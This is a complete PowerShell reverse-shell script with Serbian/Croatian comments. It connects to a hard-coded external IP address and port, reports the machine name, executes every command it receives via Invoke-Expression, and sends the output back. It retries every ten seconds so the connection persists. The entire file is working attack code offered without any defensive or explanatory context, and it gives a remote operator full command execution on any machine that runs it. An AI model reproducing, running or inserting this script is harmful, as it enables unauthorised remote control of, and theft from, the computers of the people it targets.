$address = '167.99.247.179'
$port = 54984

while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($address, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # PRVO SALJEMO SAMO IME RACUNARA (da bi list radio kako treba)
        $writer.WriteLine($env:COMPUTERNAME)

        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
            
            try {
                # Izvrsavanje komande - dodali smo prazan red na kraj rezultata
                $sendback = (Invoke-Expression $data 2>&1 | Out-String)
                if ($null -eq $sendback) { $sendback = " " }
            } catch {
                $sendback = "Greska: Komanda nije prepoznata.`n"
            }
            
            $sendback2 = "`n" + $sendback + "`nPS " + (Get-Location).Path + "> "
            $x = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($x, 0, $x.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 10
    }
}